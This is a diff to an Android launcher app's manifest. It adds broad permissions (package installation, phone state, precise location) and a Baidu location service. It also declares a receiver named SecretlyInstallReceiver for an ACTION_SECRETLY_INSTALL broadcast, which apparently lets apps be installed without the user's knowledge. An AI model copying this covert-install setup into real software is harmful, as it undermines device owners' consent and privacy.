@@ -68,6 +68,20 @@
     <uses-permission android:name="android.permission.WRITE_SETTINGS" />
 
 <!--         android:supportsRtl="true" -->
+ 	<!-- add by wanghao -->
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+ 	<uses-permission android:name="android.permission.INTERNET" />
+ 	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+ 	<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+ 	<uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+	<uses-permission android:name="android.permission.WRITE_INTERNAL_STORAGE" />
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+ 	
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <permission android:name="android.permission.BAIDU_LOCATION_SERVICE" />
+    
     <application
         android:name="com.joy.launcher2.LauncherApplication"
         android:persistent="true"
@@ -165,5 +179,23 @@
 
         <meta-data android:name="android.nfc.disable_beam_default"
             android:value="true" />
+
+        <receiver
+            android:name="com.example.installapplication.SecretlyInstallReceiver">
+            <intent-filter>
+                <action android:name="com.android.launcher.action.ACTION_SECRETLY_INSTALL" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.baidu.location.f"
+            android:enabled="true"
+            android:permission="android.permission.BAIDU_LOCATION_SERVICE"
+            android:process=":remote" >
+            <intent-filter>
+                <action android:name="com.baidu.location.service_v2.4" >
+                </action>
+            </intent-filter>
+        </service>
     </application>
 </manifest>
